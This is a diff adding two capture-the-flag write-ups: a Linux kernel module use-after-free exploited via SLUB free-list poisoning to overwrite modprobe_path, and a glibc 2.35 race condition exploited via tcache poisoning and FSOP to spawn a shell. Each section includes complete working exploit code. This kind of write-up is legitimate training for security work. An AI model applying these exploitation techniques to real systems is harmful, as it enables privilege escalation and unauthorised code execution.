@@ -354,3 +354,385 @@ change_addr(elf.got.exit, 0xd0, 0x80)
 
 p.interactive()
 ```
+
+## K-Revenge
+![K_revenge](https://raw.githubusercontent.com/elchals/elchals.github.io/main/_posts/2024-10-13_Imges/K-Revenge.png)
+
+
+- **Category:** Pwn.  
+- **Points:** 661
+- **Solves:** 4  
+- **Author:** rui  
+
+## Description
+This is an exploitation challenge of a relatively simple Kernel module. The Kernel module accepts three commands through **ioctl** calls: Write, Read, and Free.
+- Write reads a buffer from userland and copies it to kernel space. The module allocates an object of the size indicated in the ioctl and stores the pointer to this object in a global variable. The size is limited from 0x80 to 0x400 bytes. Only one object can be allocated at a time.   
+- Read reads from the object allocated in the global variable the number of bytes indicated by the ioctl and copies it to userland.  
+- Free releases the object pointed to by the global variable but does not set the global variable to NULL, allowing for a Use-After-Free (UAF) and enabling a double free.  
+One thing that makes this not a very difficult challenge is that the pointers in the SLUB free list are not mangled.  
+
+## Exploitation
+First, I obtained the kernel base through the UAF and timerfd. After this, I poisoned the SLUB free list to allocate an object in modprobe_path and overwrite it to read the flag.  
+
+## Code
+```c
+#define _GNU_SOURCE
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <sys/timerfd.h>
+
+#define WRITE 0x1111 
+#define READ 0x2222 
+#define FREE 0x3333 
+
+struct data{
+    unsigned long size;
+    char *buff;
+};
+
+struct data Data;
+char buff[0x1000];
+
+
+//######################################################################
+//######################################################################
+
+void fatal(const char *msg) {
+  perror(msg);
+  exit(1);
+}
+
+
+
+void pausa() {
+    printf("[!] PAUSA - pulsa una tecla.\n");
+    getchar();
+}
+
+int open_file(char *file, int flags, int verbose){
+    int fd = open(file, flags);
+    if (fd < 0) {
+        fatal("[!] Error al abrir el archivo.");
+    } else {
+        if (verbose) printf("[*] %s abierto con fd %d.\n", file, fd);
+    }
+    return fd;
+}
+
+void dump_buffer(void *buf, int len) {
+    printf("\n[i] Dumping %d bytes.\n\n", len);
+    for (int i = 0; i < len; i += 0x10){
+        printf("ADDR[%d, 0x%x]:\t%016lx: 0x", i / 0x08, i, (unsigned long)(buf + i));
+        for (int j = 7; j >= 0; j--) printf("%02x", *(unsigned char *)(buf + i + j));
+        printf(" - 0x");
+        for (int j = 7; j >= 0; j--) printf("%02x", *(unsigned char *)(buf + i + j + 8));
+        puts("");
+    }
+}
+
+void timer_leak() {
+    int timefd =  syscall(__NR_timerfd_create, CLOCK_REALTIME, 0);
+    struct itimerspec itimerspec;
+
+	itimerspec.it_interval.tv_sec = 0;
+	itimerspec.it_interval.tv_nsec = 0;
+	itimerspec.it_value.tv_sec = 100;
+	itimerspec.it_value.tv_nsec = 0;
+
+	timerfd_settime(timefd, 0, &itimerspec, 0);
+	close(timefd);
+	sleep(1);
+}
+
+void setup() {
+	system("echo -ne '#!/bin/sh\ncat /root/flag > /tmp/flag' > /tmp/p");
+	system("chmod a+x /tmp/p");
+	system("echo -ne '\xff\xff\xff\xff' > /tmp/executeme");
+	system("chmod a+x /tmp/executeme");
+	printf("[i] Modprobe Setup done.\n");
+}
+
+void finish() {
+	system("/tmp/executeme ; cat /tmp/flag");
+}
+
+//######################################################################
+//######################################################################
+
+
+int main(){
+
+    setup();    
+    int fd = open_file("/dev/K", O_RDWR, 1);
+
+    memset(buff, 0x41, 0x1000);
+
+    Data.size = 0x100;
+    Data.buff = buff;
+
+    ioctl(fd, WRITE, &Data);
+    memset(buff, 0, 0x1000);
+
+    ioctl(fd, FREE, &Data);
+    
+    timer_leak();
+    
+    ioctl(fd, READ, &Data);
+    
+    unsigned long kernel_base = *((unsigned long *)Data.buff + 5) - 0x2fdb30;
+    printf("[i] Kernel Base: 0x%lx\n", kernel_base);
+
+    unsigned long modprobe = kernel_base + (0xffffffff8ab3f100 - 0xffffffff89000000);
+    printf("[i] Modprobe: 0x%lx\n", modprobe);
+
+    ioctl(fd, WRITE, &Data);
+
+    memset(buff, 0, 0x1000);
+    Data.size = 0x80;
+    ioctl(fd, WRITE, &Data);
+    ioctl(fd, READ, &Data);
+    
+    ioctl(fd, FREE, &Data);
+    ioctl(fd, FREE, &Data);
+    ioctl(fd, READ, &Data);
+    dump_buffer(Data.buff, 0x80);
+
+    *(unsigned long*)(buff + 0x40) = (unsigned long)modprobe - 0x30;
+    memcpy(buff + 0x30, "/tmp/p\x00", 7);
+    ioctl(fd, WRITE, &Data);
+    ioctl(fd, WRITE, &Data);
+    ioctl(fd, WRITE, &Data);
+
+    finish();
+
+    return 0;
+}
+```
+
+## SIM
+![SIM](https://raw.githubusercontent.com/elchals/elchals.github.io/main/_posts/2024-10-13_Imges/SIM.png)
+
+
+- **Category:** Pwn.  
+- **Points:** 181
+- **Solves:** 13  
+- **Author:** hygge  
+
+## Description
+SIM is a very interesting challenge. It is perhaps the one I liked the most and the one that was the most difficult for me. The challenge has a race condition in the ExecuteTerminate and ExecuteLaunch functions, which allows for both an OOB (Out-of-Bounds) and a UAF (Use-After-Free).  
+The protections of the binary are:  
+```
+➜  SIM checksec chall 
+[*] '/home/elchals/CTFs/Tcp1p/SIM/chall'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+```
+It uses GLIBC 2.35 and when the challenge is started, it creates a thread that is controlled from the parent process through the menu:  
+```
+➜  SIM ./chall     
+[*] Controller started
+Options:
+0. Create VM
+1. Delete VM
+2. Launch VM
+3. Terminate VM
+Input: 
+[*] Backend started
+```
+
+## Exploitation
+First, I filled the tcache to obtain a libc leak using the race condition in ExecuteTerminate, causing a UAF by freeing the chunk before its contents are printed. Then, I obtained a heap leak by doing the same as before but with a chunk in tcache. After that, through the race condition in ExecuteLaunch, I performed a tcache poisoning to allocate a chunk in stdout and then ended up calling **system("/bin/sh")** using FSOP.  
+
+## Code
+```py
+#!/bin/python3
+from pwn import *
+import time
+
+context.log_level = 'INFO'
+context.terminal = ['remotinator', 'vsplit', '-x']
+context.arch = 'amd64'
+
+######################################################################################
+
+process_name = './chall_patched'
+elf = context.binary = ELF(process_name)
+libc = ELF('./libc.so.6')
+
+HOST = "ctf.tcp1p.team"
+PORT = 55551
+
+######################################################################################
+
+gdb_script = f'''
+    #set breakpoint pending on
+    continue
+    '''
+
+def create(idx, size, content, wait):
+    if wait:
+        p.sendlineafter(b'Input:', b'0')
+    else:
+        p.sendline(b'0')
+    p.sendlineafter(b'>> ', str(idx).encode())
+    p.sendlineafter(b'>> ', str(size).encode())
+    p.sendlineafter(b'>> ', content)
+
+def delete(idx):
+    p.sendlineafter(b'Input:', b'1')
+    p.sendlineafter(b'>> ', str(idx).encode())
+
+def launch(idx):
+    p.sendlineafter(b'Input:', b'2')
+    p.sendlineafter(b'>> ', str(idx).encode())
+
+def terminate():
+    p.sendlineafter(b'Input:', b'3')
+       
+
+######################################################################################
+
+def connect():
+    if args.REMOTE:
+        print(f"[*] Connecting to {HOST} : {PORT}")
+        p = remote(HOST, PORT, ssl=False)        
+    elif args.GDB:
+        print(f'[*] Debugging {elf.path}.')
+        p = gdb.debug([elf.path], gdbscript=gdb_script, aslr=False)
+    else:
+        print(f'[*] Executing {elf.path}.')
+        p = process([elf.path])
+    return p
+
+def FSOP_payload(libc):
+    file_struct_addr = libc.sym._IO_2_1_stdout_
+    print(f'[*] STDOUT addr: {hex(file_struct_addr)}')
+
+    # Payload. 
+    # ======================================= #
+    _IO_wfile_jumps = libc.symbols['_IO_wfile_jumps']
+    __GI__IO_wfile_overflow = _IO_wfile_jumps + 0x18
+    fake_vtable_pointer = __GI__IO_wfile_overflow - 0x38     # vtable + 0x38 -> __GI__IO_wfile_overflow
+    widewide_data_struc_pointer = file_struct_addr
+    flags = 0x3b111111fbad2005     
+
+    fp = FileStructure()  
+    fp.flags = flags
+    fp._IO_read_ptr = 0x68732f6e69622f                       # /bin/bash
+    fp._lock = file_struct_addr + 0x60  
+    fp._wide_data = widewide_data_struc_pointer
+    fp.vtable = fake_vtable_pointer
+    fp._old_offset = libc.sym.system                         # wide_vtable + 0x68
+
+    wide_vtable = file_struct_addr + 0x10
+    
+    payload  = bytes(fp)
+    payload += p64(wide_vtable)
+
+    print(fp)    
+    return payload
+
+######################################################################################
+
+p = connect()
+
+for i in range(12):
+    create(i, 8, p8(0x40 + i) * 7, 1)
+
+launch(0)
+
+# Fill Tcache
+for i in range(2, 9):
+    delete(i)
+
+delete(1)
+
+terminate()
+delete(0)   # Unsorted Bin
+
+# Leak Libc from unsorted bin
+print("[i] Leaking Libc Base...")
+p.recvuntil(b'[*] Your Config: \n')
+libc.address = u64(p.recv(8)) - (0x7ffff7e1ace0 - 0x7ffff7c00000)
+print("[i] Libc base:", hex(libc.address))
+
+create(0, 8, p8(0x40 ) * 7, 0)
+for i in range(1, 9):
+    create(i, 8, p8(0x40 + i) * 7, 1)
+
+delete(8)   # Tcache
+
+launch(7)
+terminate()
+delete(7)
+
+create(7, 498, p8(0x50 ) * 7, 1)
+
+# Leak Heap base
+print("[i] Leaking Heap...")
+p.recvuntil(b'\x91\x00\x00\x00\x00\x00\x00\x00')
+heap = u64(p.recv(8)) << 12
+print("[i] Heap:", hex(heap))
+
+chunk = heap + 0x670 #0x660
+print("[i] Chunk:", hex(chunk))
+
+create(8, 8, p8(0x50 ) * 7, 0)  
+
+for i in range(0, 5):
+    delete(i)
+
+delete(8)   # Victim chunk
+
+payload = FSOP_payload(libc)
+
+delete(11)
+create(11, 0x78, payload[0x70:0x70+0x77], 1)
+
+payload2 = p64(0) * 4
+payload2 += payload
+
+delete(10)
+create(10, 0x120, payload2[:0x77], 1)
+
+mangled_ptr = (libc.sym._IO_2_1_stdout_ - 0x20) ^ chunk >> 12
+
+delete(5)
+create(5, 0x21, p64(mangled_ptr), 1)
+
+delete(7)   
+create(7, 8, p8(0x47) * 7, 1)
+launch(7)
+
+delete(7)
+time.sleep(2)
+launch(5)
+
+flags = 0x00000000fbad2887
+
+p.recvuntil(b'Success')
+terminate()
+
+p.recvuntil(b'Success')
+
+create(7, 8, p8(0x47) * 7, 0)
+
+create(3, 8, p64(flags)[:-1], 1)
+launch(3)
+
+time.sleep(2)
+launch(10)
+
+######################################################################################
+
+p.interactive()
+```
